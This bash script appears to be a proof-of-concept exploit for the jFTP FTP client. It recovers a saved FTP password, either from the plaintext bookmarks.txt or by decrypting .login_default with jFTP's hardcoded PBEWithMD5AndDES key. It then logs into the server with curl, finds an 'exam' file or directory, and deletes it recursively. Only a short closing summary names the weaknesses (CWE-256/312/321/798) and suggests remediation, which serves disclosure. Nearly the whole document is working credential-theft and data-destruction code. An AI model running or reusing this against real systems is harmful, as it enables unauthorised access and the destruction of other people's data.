#!/usr/bin/env bash
#
# Recover an FTP password from jFTP's saved-login files, then delete a
# matching exam on an already-running pyftpdlib server.
# Tries ~/.jftp/bookmarks.txt first (plaintext), then .login_default
# (PBEWithMD5AndDES, hardcoded key). Connects with curl, not jFTP.
# Assumes the server and jFTP client are already running.
#
set -euo pipefail
DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${DEMO_DIR}/.." && pwd)"
JFTP_HOME_DIR="${JFTP_HOME_DIR:-${HOME}/.jftp}"
BOOKMARKS_FILE="${BOOKMARKS_FILE:-${JFTP_HOME_DIR}/bookmarks.txt}"
LOGIN_DEFAULT="${LOGIN_DEFAULT:-${JFTP_HOME_DIR}/.login_default}"
JFTP_HIDDEN_PASSWORD='<%hidden%>'
EXAM_NAME="${EXAM_NAME:-exam}"
MAX_DEPTH="${MAX_DEPTH:-6}"
CRED_HOST=""
CRED_USER=""
CRED_PASS=""
CRED_PORT=""
CRED_SOURCE=""
section() { printf '\n=== %s ===\n' "$1"; }
# bookmarks.txt: plaintext "protocol#host#user#password#port#dir#local"
try_bookmarks() {
    if [[ ! -f "${BOOKMARKS_FILE}" ]]; then
        echo "bookmarks.txt not found at ${BOOKMARKS_FILE}"
        return 1
    fi
    echo "found: ${BOOKMARKS_FILE} (plaintext, no decryption)"
    local -a cand_host=() cand_user=() cand_pass=() cand_port=()
    local raw_line line trimmed lower
    while IFS= read -r raw_line || [[ -n "${raw_line}" ]]; do
        line="${raw_line%$'\r'}"
        trimmed="${line#"${line%%[![:space:]]*}"}"
        [[ -z "${trimmed}" ]] && continue
        [[ "${trimmed}" == \#* ]] && continue
        lower="${trimmed,,}"
        [[ "${lower}" == '<dir>'* || "${lower}" == '<enddir>'* ]] && continue
        local -a fields=()
        IFS='#' read -r -a fields <<< "${trimmed}"
        [[ "${#fields[@]}" -lt 5 ]] && continue
        [[ "${fields[0]^^}" != "FTP" ]] && continue
        local host="${fields[1]:-}" user="${fields[2]:-}" \
              pass="${fields[3]:-}" port="${fields[4]:-21}"
        [[ -z "${host}" || -z "${user}" ]] && continue
        # skip empty, "0", and jFTP's <%hidden%> placeholder
        [[ -z "${pass}" || "${pass}" == "0" || "${pass}" == "${JFTP_HIDDEN_PASSWORD}" ]] && continue
        cand_host+=("${host}")
        cand_user+=("${user}")
        cand_pass+=("${pass}")
        cand_port+=("${port}")
    done < "${BOOKMARKS_FILE}"
    if [[ ${#cand_host[@]} -eq 0 ]]; then
        echo "bookmarks.txt has no FTP entry with a usable password." >&2
        return 1
    fi
    echo "FTP entries with usable passwords:"
    local i
    for i in "${!cand_host[@]}"; do
        echo "  [$((i + 1))] ${cand_user[$i]}@${cand_host[$i]}:${cand_port[$i]}"
    done
    # last non-anonymous entry (most recent); skip default public mirrors
    local idx=-1
    for ((i = ${#cand_host[@]} - 1; i >= 0; i--)); do
        if [[ "${cand_user[$i],,}" != "anonymous" ]]; then
            idx=$i
            break
        fi
    done
    if [[ ${idx} -lt 0 ]]; then
        echo "only anonymous entries; no usable credential." >&2
        return 1
    fi
    CRED_HOST="${cand_host[$idx]}"
    CRED_USER="${cand_user[$idx]}"
    CRED_PASS="${cand_pass[$idx]}"
    CRED_PORT="${cand_port[$idx]}"
    CRED_SOURCE="bookmarks.txt (plaintext, entry $((idx + 1)) of ${#cand_host[@]})"
    echo "selected: ${CRED_USER}@${CRED_HOST}:${CRED_PORT}"
    echo "plaintext password: ${CRED_PASS}"
    return 0
}
# classpath for decrypting .login_default (Windows java needs native paths)
setup_crypto_cp() {
    JFTP_SRC="${JFTP_SRC:-${REPO_ROOT}/jftp}"
    if [[ ! -f "${JFTP_SRC}/src/java/net/sf/jftp/config/Crypto.java" ]]; then
        echo "Crypto.java not found under ${JFTP_SRC}. Set JFTP_SRC." >&2
        return 1
    fi
    if ! command -v java >/dev/null 2>&1; then
        echo "'java' not on PATH." >&2
        return 1
    fi
    if [[ ! -f "${DEMO_DIR}/crypto_helper/out/CryptoCli.class" ]]; then
        echo "CryptoCli.class missing. Run ./setup.sh first." >&2
        return 1
    fi
    local to_native
    to_native() {
        if command -v cygpath >/dev/null 2>&1; then
            cygpath -w "$1"
        else
            printf '%s' "$1"
        fi
    }
    local cp_sep crypto_out_dir jftp_lib_dir
    case "$(uname -s)" in
        CYGWIN*|MINGW*|MSYS*)
            cp_sep=';'
            crypto_out_dir="$(to_native "${DEMO_DIR}/crypto_helper/out")"
            jftp_lib_dir="$(to_native "${JFTP_SRC}/lib")"
            ;;
        *)
            cp_sep=':'
            crypto_out_dir="${DEMO_DIR}/crypto_helper/out"
            jftp_lib_dir="${JFTP_SRC}/lib"
            ;;
    esac
    CRYPTO_CP="${crypto_out_dir}${cp_sep}${jftp_lib_dir}"
    return 0
}
# .login_default: encrypted with hardcoded PBEWithMD5AndDES key/salt
try_login_default() {
    if [[ ! -f "${LOGIN_DEFAULT}" ]]; then
        echo "Could not find ${LOGIN_DEFAULT} either." >&2
        return 1
    fi
    echo "found: ${LOGIN_DEFAULT}"
    echo "contents (host / user / encrypted-password / port / cwd / lcwd):"
    cat "${LOGIN_DEFAULT}"
    local ld_host ld_user ld_enc_pw ld_port
    ld_host=$(sed -n '1p' "${LOGIN_DEFAULT}")
    ld_user=$(sed -n '2p' "${LOGIN_DEFAULT}")
    ld_enc_pw=$(sed -n '3p' "${LOGIN_DEFAULT}")
    ld_port=$(sed -n '4p' "${LOGIN_DEFAULT}")
    if [[ -z "${ld_host}" || -z "${ld_user}" || -z "${ld_port}" ]]; then
        echo "FAILED: missing host/user/port." >&2
        return 1
    fi
    if [[ -z "${ld_enc_pw}" ]]; then
        echo "FAILED: empty password field." >&2
        return 1
    fi
    echo "parsed: host=${ld_host} user=${ld_user} port=${ld_port}"
    echo "encrypted password: ${ld_enc_pw}"
    echo "decrypting with jFTP Crypto (hardcoded PBEWithMD5AndDES key/salt)"
    setup_crypto_cp || return 1
    local java_out
    if ! java_out=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${ld_enc_pw}" 2>&1); then
        echo "FAILED: java error:" >&2
        echo "${java_out}" >&2
        echo "classpath: ${CRYPTO_CP}" >&2
        return 1
    fi
    if [[ -z "${java_out}" ]]; then
        echo "FAILED: Crypto.Decrypt() returned empty." >&2
        return 1
    fi
    echo "  recovered password: ${java_out}"
    CRED_HOST="${ld_host}"
    CRED_USER="${ld_user}"
    CRED_PASS="${java_out}"
    CRED_PORT="${ld_port}"
    CRED_SOURCE=".login_default (decrypted via Crypto.Decrypt())"
    return 0
}
section "0. Locate leaked FTP credentials"
if try_bookmarks; then
    :
elif try_login_default; then
    echo "(fell back to encrypted .login_default)"
else
    echo "FAILED: no usable credentials in bookmarks.txt or .login_default." >&2
    exit 1
fi
echo "using: ${CRED_SOURCE}"
echo "  ${CRED_USER}@${CRED_HOST}:${CRED_PORT}"
section "1. Connect with curl"
echo "Using curl against the recovered host/port/user."
FTP_BASE="ftp://${CRED_HOST}:${CRED_PORT}/"
AUTH=(--user "${CRED_USER}:${CRED_PASS}")
if ! LOGIN_CHECK=$(curl -sS --connect-timeout 10 "${AUTH[@]}" "${FTP_BASE}" 2>&1); then
    echo "FAILED to log in as '${CRED_USER}' at ${FTP_BASE}:" >&2
    echo "${LOGIN_CHECK}" >&2
    exit 1
fi
echo "login OK. Root listing:"
echo "${LOGIN_CHECK}"
section "2. Search for '*${EXAM_NAME}*'"
# BFS over LIST output; first name match (file or dir) wins.
declare -a queue_paths=("/")
declare -a queue_depths=(0)
FOUND_PATH=""
FOUND_KIND=""
while [[ ${#queue_paths[@]} -gt 0 ]]; do
    dir_path="${queue_paths[0]}"
    depth="${queue_depths[0]}"
    queue_paths=("${queue_paths[@]:1}")
    queue_depths=("${queue_depths[@]:1}")
    # curl only LISTs a directory when the URL ends in '/'.
    list_url="${FTP_BASE}${dir_path#/}"
    [[ "${list_url}" == */ ]] || list_url="${list_url}/"
    listing=$(curl -sS "${AUTH[@]}" "${list_url}" 2>/dev/null) || continue
    while IFS= read -r line; do
        line="${line%$'\r'}"
        [[ -z "${line}" ]] && continue
        is_dir=0
        [[ "${line}" == d* ]] && is_dir=1
        name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
        [[ -z "${name}" ]] && continue
        child_path="${dir_path%/}/${name}"
        lower_name="${name,,}"
        lower_exam="${EXAM_NAME,,}"
        if [[ "${lower_name}" == *"${lower_exam}"* ]]; then
            FOUND_PATH="${child_path}"
            FOUND_KIND=$([[ ${is_dir} -eq 1 ]] && echo dir || echo file)
            break 2
        fi
        if [[ ${is_dir} -eq 1 && ${depth} -lt ${MAX_DEPTH} ]]; then
            queue_paths+=("${child_path}")
            queue_depths+=("$((depth + 1))")
        fi
    done <<< "${listing}"
done
if [[ -z "${FOUND_PATH}" ]]; then
    echo "FAILED: no '*${EXAM_NAME}*' within ${MAX_DEPTH} levels." >&2
    echo "Override with EXAM_NAME=... ./attack.sh" >&2
    exit 1
fi
echo "found ${FOUND_KIND}: ${FOUND_PATH}"
section "3. Delete the exam"
if [[ "${FOUND_KIND}" == "file" ]]; then
    if ! DEL_OUT=$(curl -sS "${AUTH[@]}" -Q "DELE ${FOUND_PATH}" "${FTP_BASE}" 2>&1); then
        echo "FAILED to delete ${FOUND_PATH}:" >&2
        echo "${DEL_OUT}" >&2
        exit 1
    fi
    echo "deleted file: ${FOUND_PATH}"
else
    echo "directory; deleting contents, then the directory"
    # RMD only works on empty dirs, so delete files first, then dirs deepest-first
    declare -a del_files=()
    declare -a del_dirs=("${FOUND_PATH}")
    declare -a walk=("${FOUND_PATH}")
    while [[ ${#walk[@]} -gt 0 ]]; do
        cur="${walk[0]}"
        walk=("${walk[@]:1}")
        listing=$(curl -sS "${AUTH[@]}" "${FTP_BASE}${cur#/}/" 2>/dev/null) || continue
        while IFS= read -r line; do
            line="${line%$'\r'}"
            [[ -z "${line}" ]] && continue
            is_dir=0
            [[ "${line}" == d* ]] && is_dir=1
            name=$(printf '%s\n' "${line}" | awk '{for(i=1;i<=8;i++) $i=""; sub(/^ +/,""); print}')
            [[ -z "${name}" ]] && continue
            child="${cur%/}/${name}"
            if [[ ${is_dir} -eq 1 ]]; then
                del_dirs+=("${child}")
                walk+=("${child}")
            else
                del_files+=("${child}")
            fi
        done <<< "${listing}"
    done
    for f in "${del_files[@]}"; do
        if curl -sS "${AUTH[@]}" -Q "DELE ${f}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  deleted file: ${f}"
        else
            echo "  FAILED to delete file: ${f}" >&2
            exit 1
        fi
    done
    for ((i=${#del_dirs[@]}-1; i>=0; i--)); do
        d="${del_dirs[$i]}"
        if curl -sS "${AUTH[@]}" -Q "RMD ${d}" "${FTP_BASE}" >/dev/null 2>&1; then
            echo "  removed directory: ${d}"
        else
            echo "  FAILED to remove directory: ${d}" >&2
            exit 1
        fi
    done
fi
section "4. Verify"
if curl -sS "${AUTH[@]}" "${FTP_BASE}${FOUND_PATH#/}" >/dev/null 2>&1; then
    echo "FAILED: ${FOUND_PATH} still exists." >&2
    exit 1
fi
echo "confirmed: ${FOUND_PATH} is gone."
section "Summary"
cat <<SUMMARY
Credentials: ${CRED_SOURCE}
Server: ${CRED_USER}@${CRED_HOST}:${CRED_PORT}
Deleted: ${FOUND_PATH}
bookmarks.txt stores passwords in plaintext (CWE-256/CWE-312).
.login_default uses a hardcoded PBEWithMD5AndDES key (CWE-321/CWE-798).
Anyone who can read ~/.jftp/ can recover a working FTP password.
Remediation: use OS secret storage or a per-install random key; avoid
long-lived shared credentials; treat static-key encryption as plaintext.
SUMMARY